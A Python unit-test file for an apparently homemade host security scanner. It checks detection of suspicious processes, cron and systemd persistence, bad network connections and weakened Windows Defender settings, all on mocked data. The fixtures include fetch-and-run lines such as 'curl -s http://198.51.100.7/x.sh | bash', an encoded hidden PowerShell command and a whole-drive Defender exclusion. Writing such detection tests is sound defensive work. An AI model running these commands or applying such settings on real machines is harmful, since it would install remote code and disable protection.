"""用假資料測試各項系統檢查（不修改真實系統設定）。"""
import os
import unittest
from unittest import mock

from secscan.checks import network, persistence, processes, protection
from secscan.context import ScanContext
from secscan.model import Severity


def ctx():
    return ScanContext(check_signatures=False)


class ProcessTests(unittest.TestCase):
    def run_with(self, procs):
        c = ctx()
        c._processes = procs
        return {f.details.get("pid"): f for f in processes.run(c)}

    def test_suspicious_processes(self):
        procs = [
            {"pid": 10, "ppid": 1, "name": "update", "exe": "/dev/shm/update", "cmdline": "/dev/shm/update --silent"},
            {"pid": 11, "ppid": 1, "name": "kworker", "exe": "/tmp/k", "cmdline": "[kworker/0:2]"},
            {"pid": 12, "ppid": 1, "name": "x", "exe": "/usr/bin/x (deleted)", "cmdline": "x"},
            {"pid": 13, "ppid": 1, "name": "bash", "exe": "/usr/bin/bash", "cmdline": "bash -c 'curl -s http://x/a | sh'"},
            {"pid": 14, "ppid": 1, "name": "python3", "exe": "/usr/bin/python3", "cmdline": "python3 -m http.server"},
        ]
        found = self.run_with(procs)
        self.assertGreaterEqual(found[10].severity, Severity.LOW)
        self.assertGreaterEqual(found[11].severity, Severity.HIGH)
        self.assertIn(12, found)
        self.assertIn(13, found)
        self.assertNotIn(14, found)

    def test_scanner_itself_is_ignored(self):
        me = os.getpid()
        found = self.run_with([{"pid": me + 1, "ppid": me, "name": "powershell.exe", "exe": "",
                                "cmdline": "powershell -ExecutionPolicy Bypass -enc " + "A" * 40}])
        self.assertEqual(found, {})

    @mock.patch.object(processes, "IS_WINDOWS", True)
    @mock.patch.object(processes, "IS_LINUX", False)
    def test_windows_office_spawning_shell(self):
        procs = [
            {"pid": 20, "ppid": 1, "name": "WINWORD.EXE", "exe": r"C:\Program Files\Microsoft Office\WINWORD.EXE", "cmdline": ""},
            {"pid": 21, "ppid": 20, "name": "powershell.exe",
             "exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "cmdline": "powershell -w hidden"},
            {"pid": 22, "ppid": 1, "name": "svchost.exe", "exe": r"C:\Users\bob\AppData\Roaming\svchost.exe", "cmdline": ""},
        ]
        with mock.patch.dict(os.environ, {"WINDIR": r"C:\Windows"}):
            found = self.run_with(procs)
        self.assertGreaterEqual(found[21].severity, Severity.HIGH)
        self.assertGreaterEqual(found[22].severity, Severity.HIGH)
        self.assertNotIn(20, found)


class PersistenceTests(unittest.TestCase):
    def test_scoring_entries(self):
        E = persistence.Entry
        entries = [
            E("cron 排程", "/etc/cron.d/x", "a", "curl -s http://198.51.100.7/x.sh | bash"),
            E("systemd 服務", "/etc/systemd/system/y.service", "y.service", "/tmp/.x/update"),
            E("cron 排程", "/etc/crontab", "b", "/usr/sbin/logrotate /etc/logrotate.conf"),
            E("系統服務", "svc", "quiet", "/usr/sbin/sshd -D", inventory=False),
        ]
        with mock.patch.object(persistence, "collect_entries", return_value=entries):
            found = {f.details.get("command"): f for f in persistence.run(ctx())}
        self.assertGreaterEqual(found["curl -s http://198.51.100.7/x.sh | bash"].severity, Severity.LOW)
        self.assertEqual(found["/usr/sbin/logrotate /etc/logrotate.conf"].severity, Severity.INFO)
        self.assertNotIn("/usr/sbin/sshd -D", found)

    def test_lnk_strings(self):
        import tempfile
        data = (b"L\x00\x00\x00" + b"\x00" * 60 +
                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe".encode("utf-16-le") + b"\x00\x00" +
                "-w hidden -enc QQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEA".encode("utf-16-le"))
        with tempfile.NamedTemporaryFile(suffix=".lnk", delete=False) as fh:
            fh.write(data)
        try:
            text = persistence._lnk_command(fh.name)
        finally:
            os.remove(fh.name)
        self.assertIn("powershell.exe", text)
        self.assertIn("-enc", text)


class NetworkTests(unittest.TestCase):
    def test_connections(self):
        c = ctx()
        c.bad_ips = {"198.51.100.66"}
        c._processes = [
            {"pid": 1, "ppid": 0, "name": "evil", "exe": "/tmp/evil", "cmdline": "/tmp/evil"},
            {"pid": 2, "ppid": 0, "name": "miner", "exe": "/opt/m", "cmdline": "/opt/m"},
            {"pid": 3, "ppid": 0, "name": "firefox", "exe": "/usr/lib/firefox/firefox", "cmdline": "firefox"},
        ]
        conns = [
            {"proto": "tcp", "laddr": "10.0.0.2", "lport": 50000, "raddr": "198.51.100.66", "rport": 443, "state": "ESTABLISHED", "pid": 1},
            {"proto": "tcp", "laddr": "10.0.0.2", "lport": 50001, "raddr": "5.6.7.8", "rport": 3333, "state": "ESTABLISHED", "pid": 2},
            {"proto": "tcp", "laddr": "10.0.0.2", "lport": 50002, "raddr": "93.184.216.34", "rport": 443, "state": "ESTABLISHED", "pid": 3},
            {"proto": "tcp", "laddr": "127.0.0.1", "lport": 631, "raddr": "0.0.0.0", "rport": 0, "state": "LISTEN", "pid": 3},
        ]
        with mock.patch.object(network, "collect_connections", return_value=conns):
            found = {f.details.get("pid"): f for f in network.run(c)}
        self.assertEqual(found[1].severity, Severity.CRITICAL)
        self.assertGreaterEqual(found[2].severity, Severity.LOW)
        self.assertNotIn(3, found)

    def test_proc_net_parsing(self):
        self.assertEqual(network._parse_proc_addr("0100007F:0050", False), ("127.0.0.1", 80))
        self.assertEqual(network._parse_proc_addr("00000000000000000000000001000000:01BB", True), ("::1", 443))


class WindowsProtectionTests(unittest.TestCase):
    def test_defender_disabled_with_bad_exclusions(self):
        status = {
            "Ok": True, "RealTimeProtectionEnabled": False, "BehaviorMonitorEnabled": True,
            "IoavProtectionEnabled": True, "IsTamperProtected": False, "AntivirusSignatureAge": 30,
            "AMRunningMode": "Normal", "PUAProtection": 1,
            "ExclusionPath": ["C:\\", "D:\\Projects"], "ExclusionExtension": [".exe"], "ExclusionProcess": None,
        }
        threats = [{"ThreatName": "Trojan:Win32/Test", "IsActive": True, "DidThreatExecute": True,
                    "Resources": ["file:_C:\\Users\\bob\\Downloads\\a.exe"]}]
        with mock.patch.object(protection, "powershell_json", side_effect=[status, threats]):
            found = protection._windows_defender(ctx(), other_av_enabled=False)
        titles = {f.title: f.severity for f in found}
        self.assertEqual(titles["Defender 即時保護已關閉"], Severity.HIGH)
        self.assertEqual(titles["Defender 排除路徑：C:\\"], Severity.HIGH)
        self.assertEqual(titles["Defender 排除路徑：D:\\Projects"], Severity.MEDIUM)
        self.assertEqual(titles["Defender 排除副檔名：.exe"], Severity.HIGH)
        self.assertEqual(titles["Defender 偵測紀錄：Trojan:Win32/Test"], Severity.HIGH)
        self.assertIn("Defender 病毒碼已 30 天沒更新", titles)

    def test_exclusions_need_admin(self):
        status = {"Ok": True, "RealTimeProtectionEnabled": True, "AMRunningMode": "Normal",
                  "ExclusionPath": ["N/A: Must be an administrator to view exclusions"]}
        c = ctx()
        with mock.patch.object(protection, "powershell_json", side_effect=[status, None]):
            found = protection._windows_defender(c, other_av_enabled=False)
        self.assertEqual(found, [])
        self.assertTrue(any("系統管理員" in n for n in c.notes))

    def test_third_party_av(self):
        products = [{"displayName": "Windows Defender", "productState": 393472},
                    {"displayName": "Contoso Antivirus", "productState": 397568}]
        with mock.patch.object(protection, "powershell_json", return_value=products):
            found, other, ok = protection._windows_av_products(ctx())
        self.assertTrue(other and ok)
        self.assertFalse(any(f.severity >= Severity.HIGH for f in found))

    def test_no_av_enabled(self):
        with mock.patch.object(protection, "powershell_json", return_value=[{"displayName": "X", "productState": 393472}]):
            found, other, ok = protection._windows_av_products(ctx())
        self.assertTrue(any(f.title == "沒有任何啟用中的防毒軟體" for f in found))


if __name__ == "__main__":
    unittest.main()
